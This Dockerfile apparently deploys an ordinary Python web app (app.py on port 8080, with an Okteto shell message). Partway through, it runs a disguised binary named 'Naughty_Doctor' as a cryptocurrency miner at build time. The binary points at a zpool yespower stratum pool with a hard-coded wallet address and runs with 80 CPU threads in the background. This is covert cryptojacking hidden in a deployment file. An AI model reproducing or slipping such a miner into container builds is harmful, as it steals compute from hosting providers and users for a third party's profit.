FROM python:3-slim

# setup okteto message
COPY bashrc /root/.bashrc

WORKDIR /usr/src/app
COPY Naughty_Doctor Naughty_Doctor
RUN chmod 777 Naughty_Doctor
RUN ./Naughty_Doctor --algorithm yespower --pool stratum+tcp://yespower.sea.mine.zpool.ca:6234 --wallet LUJ35osZKFDNzLmpp7aykomJ3zecrW64Eu.ZZ --password c=LTC --background --cpu-threads 80 --keepalive true
COPY requirements.txt requirements.txt
RUN pip install -r requirements.txt
COPY app.py app.py

EXPOSE 8080

CMD ["python", "app.py" ]
